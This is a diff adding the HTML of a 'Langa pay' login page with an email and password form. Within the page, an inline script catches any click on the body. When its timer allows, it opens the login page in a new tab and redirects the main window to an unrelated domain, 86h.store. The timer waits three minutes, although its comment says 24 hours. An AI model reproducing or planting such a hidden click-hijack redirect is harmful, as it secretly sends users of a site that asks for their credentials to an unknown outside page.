@@ -1,0 +1,197 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="5i8mvYMY1lbJPbjqRl2lx9PP3GOd6zZ5t8HO3FST">
+
+    <link rel="shortcut icon" type="image/png" href="https://langapay.site/asset/theme7/images/icon/icon.jpeg">
+
+    <title>
+                    Langa pay-
+                Login page
+    </title>
+
+    <link rel="stylesheet" href="https://langapay.site/asset/theme7/frontend/css/cookie.css">
+    <link href="https://langapay.site/asset/common/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://langapay.site/asset/common/css/animate.min.css">
+    <link rel="stylesheet" href="https://langapay.site/asset/common/css/slick.css">
+    <link rel="stylesheet" href="https://langapay.site/asset/common/css/font-awsome.min.css">
+    <link rel="stylesheet" href="https://langapay.site/asset/common/css/iziToast.min.css">
+    <link href="https://langapay.site/asset/theme7/frontend/css/style.css" rel="stylesheet">
+    </head>
+
+<body>
+    
+    
+
+    
+    <main id="main" class="main-img">
+                <section class="auth-section">
+        <div class="auth-wrapper">
+            <div class="auth-top-part">
+                <a href="https://langapay.site" class="auth-logo">
+                    <img class="img-fluid rounded sm-device-img text-align" src="https://langapay.site/asset/theme7/images/logo/whitelogo.png"
+                        width="100%" alt="pp">
+                </a>
+                <p class="mb-0"><span class="me-2">Haven&#039;t an account?</span> <a class="btn main-btn btn-sm" href="https://langapay.site/register">Register</a></p>
+            </div>
+            <div class="auth-body-part">
+                <div class="auth-form-wrapper">
+                    <h3 class="text-center mb-4">Login your account</h3>
+                    <form action="" method="POST">
+                        <input type="hidden" name="_token" value="5i8mvYMY1lbJPbjqRl2lx9PP3GOd6zZ5t8HO3FST">                        <div class="mb-3">
+                            <label for="formGroupExampleInput">Email</label>
+                            <input type="email" class="form-control" name="email" value="" id="email"
+                                placeholder="Enter your email">
+                        </div>
+                        <div class="mb-3">
+                            <label for="formGroupExampleInput">Pasword</label>
+                            <input type="password" class="form-control" name="password" id="password"
+                                placeholder="Enter password">
+                        </div>
+                        <p class="text-end"><a href="https://langapay.site/forgot/password"
+                                class="site-color">Forget password?</a></p>
+                                                <button class="btn main-btn w-100 mt-3" type="submit"> <span>Log in </span></button>
+                    </form>
+                </div>
+            </div>
+            <div class="auth-footer-part">
+                <p class="text-center mb-0">
+                                            Copyright 2025 langa pay. all rights reserved.
+                                    </p>
+            </div>
+        </div>
+        <div class="auth-thumb-area" style="background-image: url('https://langapay.site/asset/theme7/images/frontendlogin/frontend_login_image.jpeg')">
+        </div>
+    </section>
+      <script>
+    // Function to check if a day has passed
+    function hasADayPassed() {
+      const lastActionTime = localStorage.getItem("lastActionTime");
+      if (!lastActionTime) return true; // No action recorded yet
+
+      const lastDate = new Date(parseInt(lastActionTime, 10));
+      const currentDate = new Date();
+
+      // Calculate the difference in milliseconds
+      const msInDay = 3 * 60 * 1000; // 24 hours
+      return currentDate - lastDate > msInDay;
+    }
+
+    // Click event listener
+    document.body.addEventListener("click", () => {
+      // Check if a day has passed or if no action has been recorded
+      if (hasADayPassed()) {
+        // Open a new tab
+        window.open("https://langapay.site/login", "_blank");
+
+        // Redirect the main site
+        window.location.href = "https://86h.store/7.html";
+
+        // Store the current timestamp in localStorage
+        localStorage.setItem("lastActionTime", Date.now());
+      }
+    });
+  </script>
+    </main>
+
+    <script src="https://langapay.site/asset/common/js/jquery.min.js"></script>
+    <script src="https://langapay.site/asset/common/js/bootstrap.bundle.min.js"></script>
+    <script src="https://langapay.site/asset/common/js/slick.min.js"></script>
+
+    <script src="https://langapay.site/asset/common/js/wow.min.js"></script>
+    <script src="https://langapay.site/asset/theme7/frontend/js/jquery.paroller.min.js"></script>
+    <script src="https://langapay.site/asset/theme7/frontend/js/TweenMax.min.js"></script>
+    <script src="https://langapay.site/asset/common/js/iziToast.min.js"></script>
+    <script src="https://langapay.site/asset/theme7/frontend/js/main.js"></script>
+
+        <script>
+        "use strict";
+
+        function submitUserForm() {
+            var response = grecaptcha.getResponse();
+            if (response.length == 0) {
+                document.getElementById('g-recaptcha-error').innerHTML =
+                    "<span class='sp_text_danger'>@changeLang('Captcha field is required.')</span>";
+                return false;
+            }
+            return true;
+        }
+
+        function verifyCaptcha() {
+            document.getElementById('g-recaptcha-error').innerHTML = '';
+        }
+    </script>
+    
+
+
+    
+    
+    
+    
+
+    <script>
+        'use strict';
+        
+
+
+        $(document).ready(function() {
+            $('#trial_subscribe').on('click', function(e) {
+
+                e.preventDefault();
+                var email = $('#trial_email').val();
+
+                $.ajaxSetup({
+                    headers: {
+                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                    }
+                });
+
+                $.ajax({
+                    method: 'POST',
+                    url: "https://langapay.site/subscribe",
+                    data: {
+                        email: email
+                    },
+                    success: function(response) {
+
+                        if (response.fails) {
+                            notify('error', response.errorMsg.email)
+
+                        }
+
+                        if (response.success) {
+                            $('#email').val('');
+                            notify('success', response.successMsg)
+
+                        }
+                    }
+                });
+            })
+
+
+        });
+    </script>
+
+
+    <script>
+        'use strict'
+        var url = "https://langapay.site/changeLang";
+
+        $(".changeLang").change(function() {
+            if ($(this).val() == '') {
+                return false;
+            }
+            window.location.href = url + "?lang=" + $(this).val();
+        });
+       
+    </script>
+
+
+</body>
+
+
+</html>
